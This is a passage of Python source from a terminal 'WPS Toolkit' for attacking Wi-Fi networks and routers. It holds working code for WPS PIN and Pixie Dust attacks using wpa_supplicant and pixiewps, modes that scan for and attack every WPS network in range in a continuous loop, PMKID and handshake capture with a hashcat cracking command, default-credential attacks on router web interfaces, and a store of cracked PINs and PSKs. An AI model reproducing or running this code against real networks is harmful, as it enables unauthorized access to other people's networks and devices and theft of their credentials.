                          ("Sessions", ".OneShot-Extended/sessions")]:
            d = home / path
            if d.exists():
                files = list(d.glob("*"))
                if files:
                    con.print(f"\n[yellow]{name}:[/]")
                    for f in files:
                        con.print(f"  {f.name} -> {f.read_text().strip()[:50]}")
                else:
                    con.print(f"[dim]{name}: empty[/]")
        Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: LIVE MONITOR
    # ═══════════════════════════════════════
    def view_live(self):
        con.print("[dim]Live Dashboard - Ctrl+C to exit[/]\n")
        try:
            with Live(console=con, refresh_per_second=1, screen=True) as live:
                while True:
                    uptime = int(time.time() - self.start_time)
                    ut = "{:02d}:{:02d}:{:02d}".format(uptime//3600, (uptime%3600)//60, uptime%60)
                    cpu = psutil.cpu_percent(interval=0.1)
                    mem = psutil.virtual_memory()
                    disk = psutil.disk_usage("/")
                    st = self.db.get_stats()

                    layout = Layout()
                    layout.split_column(
                        Layout(name="h", size=3),
                        Layout(name="b"),
                        Layout(name="f", size=3))
                    layout["b"].split_row(
                        Layout(name="l", ratio=2),
                        Layout(name="r", ratio=1))
                    layout["l"].split_column(
                        Layout(name="stats", size=8),
                        Layout(name="log"))
                    layout["r"].split_column(
                        Layout(name="sys", size=10),
                        Layout(name="atk"))

                    layout["h"].update(Panel(
                        f"[hdr]WPS Toolkit Live[/]  |  {ut}  |  {datetime.now():%H:%M:%S}",
                        style="cyan"))

                    tx = Text()
                    tx.append(f"  Networks: {st['total']}  ", style="bold cyan")
                    tx.append(f"WPS: {st['wps']}  ", style="bold green")
                    tx.append(f"Open: {st['wps_open']}  ", style="green")
                    tx.append(f"Locked: {st['wps_locked']}  ", style="red")
                    tx.append(f"Targets: {st['targets']}  ", style="yellow")
                    tx.append(f"Compromised: {st['compromised']}", style="bold green")
                    layout["stats"].update(Panel(tx, title="Stats", border_style="cyan"))

                    acts = self.db.get_log(8)
                    at = Text()
                    for a in acts:
                        sev_c = {"success":"green","warning":"yellow",
                                "error":"red","info":"dim"}.get(a["severity"], "dim")
                        at.append(f"  {str(a['timestamp'])[:19]} {a['message']}\n", style=sev_c)
                    if not acts:
                        at.append("  No activity", style="dim")
                    layout["log"].update(Panel(at, title="Activity", border_style="dim"))

                    cc = "green" if cpu < 60 else ("yellow" if cpu < 85 else "red")
                    mc = "green" if mem.percent < 60 else ("yellow" if mem.percent < 85 else "red")
                    sy = Text()
                    sy.append(f"  CPU:  {cpu}%\n", style=cc)
                    sy.append(f"  RAM:  {mem.percent}% ({mem.used//(1024**2)}MB/{mem.total//(1024**2)}MB)\n", style=mc)
                    sy.append(f"  Disk: {disk.percent}%\n")
                    layout["sys"].update(Panel(sy, title="System", border_style="green"))

                    active = self.db.get_active_sessions()
                    ak = Text()
                    if active:
                        for a in active:
                            ak.append(f"  {a['attack_type']}: {a['essid']}\n", style="red")
                    else:
                        ak.append("  No active attacks", style="dim")
                    layout["atk"].update(Panel(ak, title="Attacks", border_style="red"))

                    layout["f"].update(Panel("[dim]Ctrl+C to exit[/]", style="dim"))
                    live.update(layout)
                    time.sleep(1)
        except KeyboardInterrupt:
            pass

    # ═══════════════════════════════════════
    # VIEW: CREDENTIALS
    # ═══════════════════════════════════════
    def view_creds(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Credentials Vault[/]", style="cyan"))
            creds = self.db.get_credentials()
            con.print(f"\n  Stored: [inf]{len(creds)}[/]")
            con.print("\n  [mn]1[/] View All  [mn]2[/] Search  [mn]0[/] Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                if not creds:
                    con.print("[warn]No credentials.[/]")
                else:
                    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
                    t.add_column("#", width=3)
                    t.add_column("ESSID")
                    t.add_column("BSSID", min_width=17)
                    t.add_column("PIN", style="green")
                    t.add_column("PSK", style="green")
                    t.add_column("Method")
                    t.add_column("Time")
                    for i, c in enumerate(creds, 1):
                        t.add_row(str(i), c["essid"] or "-", c["bssid"],
                                  c["pin"] or "-", c["psk"] or "-",
                                  c["method"] or "-", str(c["captured_at"])[:16])
                    con.print(t)
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                b = Prompt.ask("BSSID").upper()
                res = self.db.fetch_all("SELECT * FROM credentials WHERE bssid=?", (b,))
                for c in res:
                    con.print(f"  {c['essid']} PIN:{c['pin']} PSK:{c['psk']}")
                if not res:
                    con.print("[warn]Not found[/]")
                Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: REPORTS
    # ═══════════════════════════════════════
    def view_reports(self):
        while True:
            con.clear()
            con.print(Rule("[hdr]Reports & Statistics[/]", style="cyan"))
            con.print("\n  [mn]1[/] Overview  [mn]2[/] HTML Report  [mn]3[/] Export JSON")
            con.print("  [mn]4[/] Backup DB  [mn]0[/] Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                st = self.db.get_stats()
                t = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
                t.add_column("Metric", style="dim")
                t.add_column("Value", style="bold cyan")
                for k, v in st.items():
                    t.add_row(k, str(v))
                con.print(Panel(t, title="Overview", border_style="cyan"))
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "2":
                with con.status("[ok]Generating...", spinner="dots"):
                    p = generate_html(self.db)
                con.print(f"[ok]Saved: {p}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "3":
                with con.status("[ok]Exporting...", spinner="dots"):
                    p = export_json(self.db)
                con.print(f"[ok]Saved: {p}[/]")
                Prompt.ask("\n[dim]Enter[/]")
            elif ch == "4":
                p = self.db.backup()
                con.print(f"[ok]Backup: {p}[/]")
                Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: DEVICE INFO
    # ═══════════════════════════════════════
    def view_device(self):
        con.clear()
        con.print(Rule("[hdr]Device Info[/]", style="cyan"))

        t = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
        t.add_column("Key", style="dim", min_width=18)
        t.add_column("Value", style="cyan")
        t.add_row("Architecture", os.uname().machine)
        t.add_row("Kernel", os.uname().release[:60])
        t.add_row("Python", sys.version.split()[0])
        t.add_row("Root", "Yes" if os.getuid() == 0 else "No")

        ifaces = get_interfaces()
        t.add_row("Interfaces", ", ".join(ifaces) if ifaces else "None")

        tools = ["iw","airmon-ng","airodump-ng","wash","reaver",
                "pixiewps","wpa_cli","macchanger","mdk4"]
        inst = sum(1 for tool in tools if shutil.which(tool))
        t.add_row("Tools", f"{inst}/{len(tools)}")

        con.print(Panel(t, title="Device", border_style="cyan"))

        con.print("\n[inf]Tools:[/]")
        for tool in tools:
            icon = "[ok]V[/]" if shutil.which(tool) else "[err]X[/]"
            con.print(f"  {icon} {tool}")

        Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: SETTINGS
    # ═══════════════════════════════════════
    # ═══════════════════════════════════════
    # WPS ENGINE METHODS (Direct wpa_supplicant)
    # ═══════════════════════════════════════

    def _direct_wps_pin(self):
        """Direct WPS PIN attack using own wpa_supplicant"""
        con.clear()
        con.print(Rule("[hdr]Direct WPS PIN Attack[/]", style="cyan"))
        con.print("[dim]Uses own wpa_supplicant instance (like ose.py)[/]\n")

        bssid = self._select_network()
        if not bssid:
            return

        n = self.db.get_network(bssid)
        essid = _get_field(n, "essid", "Unknown")

        # Get PIN suggestions
        from modules.wps_pins import suggest_pins
        pins = suggest_pins(bssid)[:8]
        if pins:
            con.print("\n  [hdr]Suggested PINs:[/]")
            for i, p in enumerate(pins[:6], 1):
                con.print(f"    {i}. [ok]{p['pin']}[/] ({p['method']})")

        pin = Prompt.ask("\nPIN (or # from list)", default=pins[0]["pin"] if pins else "12345670")

        # Try to parse as list number
        try:
            idx = int(pin)
            if 1 <= idx <= len(pins):
                pin = pins[idx - 1]["pin"]
        except (ValueError, IndexError):
            pass

        con.print(f"\n[hdr]Starting direct WPS PIN attack[/]")
        con.print(f"  Target: [inf]{essid}[/] ({bssid})")
        con.print(f"  PIN: [ok]{pin}[/]\n")

        if not Confirm.ask("Start?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        engine = WpsEngine(iface)

        con.print("[dim]Starting wpa_supplicant...[/]")
        ok, msg = engine.start()
        if not ok:
            con.print(f"[err]Failed: {msg}[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        con.print("[ok]wpa_supplicant started[/]\n")

        def output_cb(line):
            ll = line.lower()
            if 'found' in ll or 'success' in ll or 'psk' in ll:
                con.print(f"[ok]{line}[/]")
            elif 'nack' in ll or 'locked' in ll or 'wrong' in ll:
                con.print(f"[warn]{line}[/]")
            elif 'error' in ll or 'fail' in ll:
                con.print(f"[err]{line}[/]")
            elif 'm1' in ll or 'm2' in ll or 'm3' in ll or 'm4' in ll:
                con.print(f"[ok]{line}[/]")
            elif 'scanning' in ll or 'authenticat' in ll or 'associat' in ll:
                con.print(f"[inf]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        engine.callback = output_cb

        try:
            result = engine.wps_pin_attack(bssid, pin, timeout=60)
        except KeyboardInterrupt:
            con.print("\n[warn]Stopped[/]")
            result = engine._result()
        finally:
            engine.stop()

        # Show results
        con.print(f"\n{'='*50}")
        con.print(f"  Status: {result['status']}")
        if result.get('pin'):
            con.print(f"  PIN: [ok]{result['pin']}[/]")
        if result.get('psk'):
            con.print(f"  PSK: [ok]{result['psk']}[/]")
        con.print(f"  Last M: {result.get('last_m', 0)}")
        con.print(f"  Locked: {result.get('is_locked', False)}")
        con.print(f"{'='*50}")

        # Save to DB
        if result['status'] == 'success':
            self.db.add_credential(bssid, essid, result['pin'], result['psk'], "Direct WPS")
            self.db.execute("UPDATE networks SET status='compromised' WHERE bssid=?", (bssid,))
            self.db.log("success", "wps_engine", f"PIN: {result['pin']} PSK: {result['psk']}", "ok")

        Prompt.ask("\n[dim]Enter[/]")

    def _direct_pixie(self):
        """Direct Pixie Dust attack - collect data then crack"""
        con.clear()
        con.print(Rule("[hdr]Direct Pixie Dust Attack[/]", style="cyan"))
        con.print("[dim]Collects WPS handshake data then runs pixiewps[/]\n")

        bssid = self._select_network()
        if not bssid:
            return

        n = self.db.get_network(bssid)
        essid = _get_field(n, "essid", "Unknown")

        con.print(f"  Target: [inf]{essid}[/] ({bssid})")
        con.print("\n  This will try multiple PINs to collect handshake data")
        con.print("  then run pixiewps to crack the PIN offline.\n")

        if not Confirm.ask("Start?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        engine = WpsEngine(iface)

        ok, msg = engine.start()
        if not ok:
            con.print(f"[err]{msg}[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        con.print("[ok]wpa_supplicant started[/]\n")

        def output_cb(line):
            ll = line.lower()
            if 'collecting' in ll or 'collected' in ll:
                con.print(f"[hdr]{line}[/]")
            elif 'found' in ll or 'success' in ll:
                con.print(f"[ok]{line}[/]")
            elif 'nack' in ll or 'locked' in ll:
                con.print(f"[warn]{line}[/]")
            elif 'pke' in ll or 'pkr' in ll or 'hash' in ll or 'nonce' in ll:
                con.print(f"[ok]{line}[/]")
            elif 'error' in ll:
                con.print(f"[err]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        engine.callback = output_cb

        try:
            result = engine.collect_pixie_data(bssid, max_attempts=8)
        except KeyboardInterrupt:
            con.print("\n[warn]Stopped[/]")
            result = {'status': 'stopped', 'pixie_data': engine.pixie_data}
        finally:
            engine.stop()

        # Show collected data
        pixie = result.get('pixie_data', {})
        con.print(f"\n{'='*50}")
        con.print("[hdr]Collected Pixie Dust Data:[/]")
        for key in ['PKE', 'PKR', 'E_NONCE', 'R_NONCE', 'AUTHKEY', 'E_HASH1', 'E_HASH2']:
            val = pixie.get(key, '')
            if val:
                con.print(f"  {key}: [ok]{val[:40]}...[/]")
            else:
                con.print(f"  {key}: [dim]missing[/]")

        collected = sum(1 for k in ['PKE','PKR','E_NONCE','R_NONCE','AUTHKEY','E_HASH1','E_HASH2']
                       if pixie.get(k))
        con.print(f"\n  Collected: [bold]{collected}/7[/]")
        con.print(f"{'='*50}")

        # Try pixiewps if we have enough data
        if collected >= 4 and pixie.get('PKE'):
            con.print("\n[hdr]Running pixiewps...[/]")
            import shutil
            if shutil.which('pixiewps'):
                cmd = [
                    'pixiewps',
                    '--pke', pixie.get('PKE', ''),
                    '--pkr', pixie.get('PKR', ''),
                    '--e-hash1', pixie.get('E_HASH1', ''),
                    '--e-hash2', pixie.get('E_HASH2', ''),
                    '--authkey', pixie.get('AUTHKEY', ''),
                    '--e-nonce', pixie.get('E_NONCE', ''),
                    '--r-nonce', pixie.get('R_NONCE', ''),
                    '--e-bssid', bssid.replace(':', ''),
                    '--mode', '1,2,3,4,5',
                ]
                try:
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                    con.print(r.stdout)
                    if r.returncode == 0:
                        # Extract PIN
                        for line in r.stdout.split('\n'):
                            if 'WPS pin' in line and '[+]' in line:
                                pin = line.split(':')[-1].strip()
                                if pin and pin != '<empty>':
                                    con.print(f"\n[ok]PIN FOUND: {pin}[/]")
                                    self.db.add_credential(bssid, essid, pin, '', 'Pixie Dust')
                                    self.db.log("success", "pixie", f"PIN: {pin}", "ok")
                except Exception as e:
                    con.print(f"[err]pixiewps error: {e}[/]")
            else:
                con.print("[err]pixiewps not installed![/]")
        else:
            con.print("[warn]Not enough data for pixiewps[/]")
            con.print("[dim]Try: ose.py with --pixie-dust flag[/]")

        Prompt.ask("\n[dim]Enter[/]")

    def _direct_pbc(self):
        """Direct WPS Push Button Connect"""
        con.clear()
        con.print(Rule("[hdr]Direct WPS PBC[/]", style="cyan"))
        con.print("[dim]Push Button Connect via own wpa_supplicant[/]\n")

        bssid = Prompt.ask("BSSID (Enter for any)", default="")
        con.print("\n[yellow]Press the WPS button on the router NOW![/]")
        con.print("[dim]You have 2 minutes...[/]\n")

        if not Confirm.ask("WPS button pressed?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        engine = WpsEngine(iface)

        ok, msg = engine.start()
        if not ok:
            con.print(f"[err]{msg}[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        def output_cb(line):
            ll = line.lower()
            if 'found' in ll or 'success' in ll or 'psk' in ll:
                con.print(f"[ok]{line}[/]")
            elif 'selected' in ll:
                con.print(f"[hdr]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        engine.callback = output_cb

        try:
            result = engine.wps_pbc_attack(bssid if bssid else None, timeout=120)
        except KeyboardInterrupt:
            con.print("\n[warn]Stopped[/]")
            result = {'status': 'stopped'}
        finally:
            engine.stop()

        con.print(f"\n  Status: {result.get('status')}")
        if result.get('psk'):
            con.print(f"  PSK: [ok]{result['psk']}[/]")

        Prompt.ask("\n[dim]Enter[/]")

    def _direct_scan(self):
        """Scan using WPS Engine"""
        con.clear()
        con.print(Rule("[hdr]WPS Engine Scan[/]", style="cyan"))

        iface = self.cfg.get("interface", "wlan0")
        engine = WpsEngine(iface)

        con.print("[dim]Starting wpa_supplicant...[/]")
        ok, msg = engine.start()
        if not ok:
            con.print(f"[err]{msg}[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        con.print("[ok]Started[/]")
        con.print("[dim]Scanning...[/]\n")

        engine.scan()
        time.sleep(4)

        nets = engine.get_scan_results()
        engine.stop()

        if nets:
            net_table(nets, f"WPS Engine Scan ({len(nets)} networks)")
            nc = 0
            for n in nets:
                if not self.db.get_network(n["bssid"]):
                    nc += 1
                self.db.add_network(n)
            con.print(f"\n  [ok]{len(nets)} networks ({nc} new) saved[/]")
        else:
            con.print("[warn]No networks found[/]")

        Prompt.ask("\n[dim]Enter[/]")

    def _select_network(self):
        """Helper: select network from database list"""
        nets = self.db.get_all_networks()
        if nets:
            net_table(nets, "Select Target")
            sel = Prompt.ask("Enter # or BSSID", default="1")
            try:
                idx = int(sel)
                if 1 <= idx <= len(nets):
                    return nets[idx - 1]["bssid"]
            except (ValueError, IndexError):
                pass
            return sel.strip().upper()
        else:
            return Prompt.ask("BSSID").strip().upper()

    # ═══════════════════════════════════════
    # VIEW: AUTO-WPS (Continuous Attack)
    # ═══════════════════════════════════════
    def view_auto_wps(self):
        """Automated WPS attack with lock monitoring"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Auto-WPS Engine[/]", style="cyan"))
            con.print()
            con.print("  [mn]1[/] - Auto Attack Single Target")
            con.print("  [mn]2[/] - Scan & Attack All WPS Networks")
            con.print("  [mn]3[/] - Monitor Lock (wait for unlock)")
            con.print("  [mn]4[/] - Continuous Scan & Attack Loop")
            con.print("  [mn]0[/] - Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break

            elif ch == "1":
                self._auto_single()

            elif ch == "2":
                self._auto_scan_all()

            elif ch == "3":
                self._auto_monitor_lock()

            elif ch == "4":
                self._auto_loop()

    def _auto_single(self):
        """Auto attack single target"""
        con.clear()
        con.print(Rule("[hdr]Auto Attack Single Target[/]", style="cyan"))

        nets = self.db.get_all_networks()
        if nets:
            net_table(nets, "Select Target")
            sel = Prompt.ask("Enter # or BSSID", default="1")
            try:
                idx = int(sel)
                if 1 <= idx <= len(nets):
                    n = nets[idx-1]
                    bssid = n["bssid"]
                    essid = str(_get_field(n, "essid", "Unknown"))
                else:
                    bssid = sel.upper()
                    essid = "Unknown"
            except ValueError:
                bssid = sel.upper()
                n = self.db.get_network(bssid)
                essid = str(_get_field(n, "essid", "Unknown")) if n else "Unknown"
        else:
            bssid = Prompt.ask("BSSID").upper()
            essid = "Unknown"

        max_cycles = IntPrompt.ask("Max cycles", default=50)
        lock_wait = IntPrompt.ask("Lock wait (seconds)", default=60)

        con.print(f"\n[hdr]Auto-WPS on {essid} ({bssid})[/]")
        con.print(f"  Max cycles: {max_cycles}")
        con.print(f"  Lock wait: {lock_wait}s")
        con.print("[dim]Ctrl+C to stop[/]\n")

        if not Confirm.ask("Start?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        auto = AutoWPS(iface, self.db)

        def cb(line):
            ll = line.lower()
            if "success" in ll or "psk" in ll or "pin" in ll:
                con.print(f"[ok]{line}[/]")
            elif "locked" in ll or "wait" in ll:
                con.print(f"[warn]{line}[/]")
            elif "error" in ll or "fail" in ll:
                con.print(f"[err]{line}[/]")
            elif "cycle" in ll or "target" in ll:
                con.print(f"[hdr]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        auto.callback = cb

        try:
            result = auto.auto_attack(bssid, essid, max_cycles, lock_wait)
        except KeyboardInterrupt:
            auto.stop()
            result = {"status": "stopped"}

        con.print(f"\nResult: {result.get('status')}")
        if result.get("psk"):
            con.print(f"[ok]PSK: {result['psk']}[/]")
        Prompt.ask("\n[dim]Enter[/]")

    def _auto_scan_all(self):
        """Scan and attack all WPS networks"""
        con.clear()
        con.print(Rule("[hdr]Scan & Attack All WPS[/]", style="cyan"))
        con.print("\n[yellow]This will continuously scan and attack all WPS networks[/]")
        con.print("[dim]Ctrl+C to stop[/]\n")

        if not Confirm.ask("Start?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        auto = AutoWPS(iface, self.db)

        def cb(line):
            ll = line.lower()
            if "success" in ll or "found" in ll:
                con.print(f"[ok]{line}[/]")
            elif "target" in ll or "scan" in ll:
                con.print(f"[hdr]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        auto.callback = cb

        scanner_func = lambda iface: scanner.scan_iw(iface, 20) if 'scanner' in dir() else []

        try:
            auto.auto_scan_and_attack()
        except KeyboardInterrupt:
            auto.stop()
        Prompt.ask("\n[dim]Enter[/]")

    def _auto_monitor_lock(self):
        """Monitor lock status"""
        con.clear()
        con.print(Rule("[hdr]Monitor Lock Status[/]", style="cyan"))

        nets = self.db.get_all_networks()
        if nets:
            net_table(nets, "Select Target")
            sel = Prompt.ask("Enter # or BSSID", default="1")
            try:
                idx = int(sel)
                bssid = nets[idx-1]["bssid"] if 1 <= idx <= len(nets) else sel.upper()
            except (ValueError, IndexError):
                bssid = sel.upper()
        else:
            bssid = Prompt.ask("BSSID").upper()

        timeout = IntPrompt.ask("Monitor timeout (seconds)", default=3600)

        con.print(f"\n[hdr]Monitoring {bssid}[/]")
        con.print("[dim]Will try PIN every 30s to detect unlock[/]\n")

        iface = self.cfg.get("interface", "wlan0")
        auto = AutoWPS(iface, self.db)
        auto.callback = lambda line: con.print(f"[dim]{line}[/]")

        try:
            result = auto.monitor_lock(bssid, timeout)
        except KeyboardInterrupt:
            auto.stop()
            result = {"status": "stopped"}

        con.print(f"Result: {result.get('status')}")
        Prompt.ask("\n[dim]Enter[/]")

    def _auto_loop(self):
        """Continuous scan and attack loop"""
        con.clear()
        con.print(Rule("[hdr]Continuous Loop[/]", style="cyan"))
        con.print("\n[yellow]Scans → Attacks → Waits → Repeats[/]")
        con.print("[dim]Ctrl+C to stop[/]\n")

        if not Confirm.ask("Start?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        auto = AutoWPS(iface, self.db)

        def cb(line):
            con.print(f"[dim]{line}[/]")
        auto.callback = cb

        try:
            while True:
                con.print("\n[hdr]=== Scanning... ===[/]")
                nets = auto._quick_scan()
                wps = [n for n in nets if n.get("has_wps")]
                con.print(f"[inf]Found {len(wps)} WPS networks[/]")

                for net in wps:
                    if not auto.running:
                        break
                    con.print(f"\n[hdr]Attacking: {net['essid']} ({net['bssid']})[/]")
                    result = auto.auto_attack(
                        net["bssid"], net.get("essid", ""),
                        max_cycles=10, lock_wait=60
                    )
                    if result.get("status") == "success":
                        con.print(f"[ok]SUCCESS: {result.get('psk')}[/]")

                con.print("\n[dim]Waiting 60s before next scan...[/]")
                time.sleep(60)
        except KeyboardInterrupt:
            auto.stop()
        Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: ROUTER EXPLOITER
    # ═══════════════════════════════════════
    def view_router_exploit(self):
        """Router web interface exploitation"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Router Exploiter[/]", style="cyan"))

            router_ip = get_router_ip()
            con.print(f"\n  Router IP: [inf]{router_ip}[/]")

            con.print("\n  [mn]1[/] - Scan Router Ports")
            con.print("  [mn]2[/] - Fingerprint Router")
            con.print("  [mn]3[/] - Try Default Credentials")
            con.print("  [mn]4[/] - Full Exploit (scan + fingerprint + creds)")
            con.print("  [mn]5[/] - Change Target IP")
            con.print("  [mn]0[/] - Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break

            elif ch == "1":
                con.print(f"\n[inf]Scanning {router_ip}...[/]")
                exp = RouterExploiter(router_ip)
                ports = exp.scan_ports()
                if ports:
                    for p in ports:
                        con.print(f"  [ok]Port {p['port']} OPEN[/] ({p['server']})")
                else:
                    con.print("[warn]No open ports found[/]")
                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "2":
                exp = RouterExploiter(router_ip)
                exp.scan_ports()
                con.print("\n[inf]Fingerprinting...[/]")
                info = exp.fingerprint()
                if info:
                    for k, v in info.items():
                        con.print(f"  {k}: [cyan]{v}[/]")
                else:
                    con.print("[warn]Could not identify router[/]")
                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "3":
                exp = RouterExploiter(router_ip)
                exp.scan_ports()
                exp.fingerprint()
                brand = exp.router_info.get("brand", "generic")
                con.print(f"  Brand: [cyan]{brand}[/]")
                con.print("\n[inf]Trying default credentials...[/]")
                creds = exp.try_default_creds()
                if creds:
                    for c in creds:
                        con.print(f"  [ok]{c['username']}:{c['password']} ({c['method']})[/]")
                else:
                    con.print("[warn]No default credentials worked[/]")
                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "4":
                con.print(f"\n[hdr]Full Exploit on {router_ip}[/]\n")
                exp = RouterExploiter(router_ip)

                con.print("[dim]1. Scanning ports...[/]")
                ports = exp.scan_ports()
                con.print(f"  Found {len(ports)} open ports\n")

                con.print("[dim]2. Fingerprinting...[/]")
                info = exp.fingerprint()
                brand = info.get("brand", "Unknown")
                con.print(f"  Brand: {brand}\n")

                con.print("[dim]3. Trying default credentials...[/]")
                creds = exp.try_default_creds()

                if creds:
                    con.print("\n[ok]DEFAULT CREDENTIALS FOUND![/]")
                    for c in creds:
                        con.print(f"  [ok]{c['username']}:{c['password']}[/]")
                else:
                    con.print("[warn]No default credentials worked[/]")

                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "5":
                router_ip = Prompt.ask("Router IP", default=router_ip)
                con.print(f"[ok]Target: {router_ip}[/]")
                time.sleep(1)

    # ═══════════════════════════════════════
    # VIEW: WORDLIST GENERATOR
    # ═══════════════════════════════════════
    def view_wordlist(self):
        """Smart wordlist generator"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Wordlist Generator[/]", style="cyan"))

            con.print("\n  [mn]1[/] - Generate for Specific Network")
            con.print("  [mn]2[/] - Generate for All Targets")
            con.print("  [mn]3[/] - Quick Wordlist from ESSID")
            con.print("  [mn]0[/] - Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break

            elif ch == "1":
                essid = Prompt.ask("ESSID (network name)")
                brand = Prompt.ask("Brand (TP-Link/ZTE/Huawei/etc)", default="")
                max_w = IntPrompt.ask("Max words", default=10000)

                con.print(f"\n[inf]Generating wordlist for '{essid}'...[/]")
                gen = WordlistGenerator()
                words = gen.generate_for_network(essid, brand=brand, max_words=max_w)

                con.print(f"[ok]Generated {len(words)} passwords[/]")

                # Show sample
                con.print("\nSample:")
                for w in words[:20]:
                    con.print(f"  {w}")
                if len(words) > 20:
                    con.print(f"  ... and {len(words)-20} more")

                if Confirm.ask("\nSave to file?", default=True):
                    fname = Prompt.ask("Filename", default=f"/tmp/wl_{essid.replace(' ','_')}.txt")
                    count = gen.save_to_file(fname, max_w)
                    con.print(f"[ok]Saved {count} passwords to {fname}[/]")

                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "2":
                tgts = self.db.get_targets()
                if not tgts:
                    con.print("[warn]No targets[/]")
                    Prompt.ask("\n[dim]Enter[/]")
                    continue

                gen = WordlistGenerator()
                all_words = set()

                for t in tgts:
                    essid = str(_get_field(t, "essid", ""))
                    if essid and essid != "Hidden":
                        words = gen.generate_from_essid(essid)
                        all_words.update(words)

                con.print(f"[ok]Generated {len(all_words)} unique passwords[/]")

                fname = Prompt.ask("Filename", default="/tmp/wl_targets.txt")
                with open(fname, "w") as f:
                    for w in sorted(all_words):
                        f.write(w + "\n")
                con.print(f"[ok]Saved to {fname}[/]")
                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "3":
                essid = Prompt.ask("ESSID")
                gen = WordlistGenerator()
                words = gen.generate_from_essid(essid)
                con.print(f"\n[ok]{len(words)} passwords:[/]")
                for w in words[:30]:
                    con.print(f"  {w}")
                if len(words) > 30:
                    con.print(f"  ... +{len(words)-30} more")
                Prompt.ask("\n[dim]Enter[/]")

    def view_handshake(self):
        """WPA Handshake Capture & Analysis"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Handshake Capture & Analysis[/]", style="cyan"))
            con.print("[dim]Captures handshake via wpa_supplicant - no monitor mode needed[/]")
            con.print()
            con.print("  [mn]1[/] - Capture PMKID (fast)")
            con.print("  [mn]2[/] - Capture Full Handshake")
            con.print("  [mn]3[/] - Capture from Targets")
            con.print("  [mn]4[/] - Analyze Captures")
            con.print("  [mn]5[/] - List All Captures")
            con.print("  [mn]6[/] - Crack Command")
            con.print("  [mn]0[/] - Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            elif ch == "1":
                self._capture_pmkid()
            elif ch == "2":
                self._capture_full()
            elif ch == "3":
                self._capture_batch()
            elif ch == "4":
                self._analyze_captures()
            elif ch == "5":
                self._list_captures()
            elif ch == "6":
                self._crack_cmd()

    def _select_target(self):
        nets = self.db.get_all_networks()
        if nets:
            net_table(nets, "Select Target")
            sel = Prompt.ask("# or BSSID", default="1")
            try:
                idx = int(sel)
                if 1 <= idx <= len(nets):
                    n = nets[idx-1]
                    return str(_get_field(n, "bssid")), str(_get_field(n, "essid", "Hidden"))
            except ValueError:
                pass
            return sel.strip().upper(), "Unknown"
        return Prompt.ask("BSSID").strip().upper(), Prompt.ask("ESSID", default="Unknown")

    def _capture_pmkid(self):
        con.clear()
        con.print(Rule("[hdr]PMKID Capture[/]", style="cyan"))
        bssid, essid = self._select_target()
        if not bssid:
            return
        con.print(f"\n  Target: [inf]{essid}[/] ({bssid})\n")
        iface = self.cfg.get("interface", "wlan1")
        cap = HandshakeCapture(iface)
        cap.callback = lambda l: con.print(f"[dim]{l}[/]")
        try:
            result = cap.capture_pmkid(bssid, essid, timeout=20)
        except KeyboardInterrupt:
            result = {"status": "stopped"}
        con.print(f"\n  Status: {result.get('status')}")
        if result.get("pmkid"):
            con.print(f"  PMKID: [ok]{result['pmkid']}[/]")
            con.print(f"  Crack: [cyan]hashcat -m 22000 <file> wordlist.txt[/]")
        if result.get("files"):
            for f in result["files"]:
                con.print(f"  File: [dim]{f}[/]")
        Prompt.ask("\n[dim]Enter[/]")

    def _capture_full(self):
        con.clear()
        con.print(Rule("[hdr]Full Handshake Capture[/]", style="cyan"))
        bssid, essid = self._select_target()
        if not bssid:
            return
        con.print(f"\n  Target: [inf]{essid}[/] ({bssid})\n")
        iface = self.cfg.get("interface", "wlan1")
        cap = HandshakeCapture(iface)
        cap.callback = lambda l: con.print(f"[dim]{l}[/]")
        try:
            result = cap.capture_via_connect(bssid, essid, timeout=30)
        except KeyboardInterrupt:
            result = {"status": "stopped"}
        con.print(f"\n  Status: {result.get('status')}")
        if result.get("pmkid"):
            con.print(f"  PMKID: [ok]{result['pmkid']}[/]")
        if result.get("anonce"):
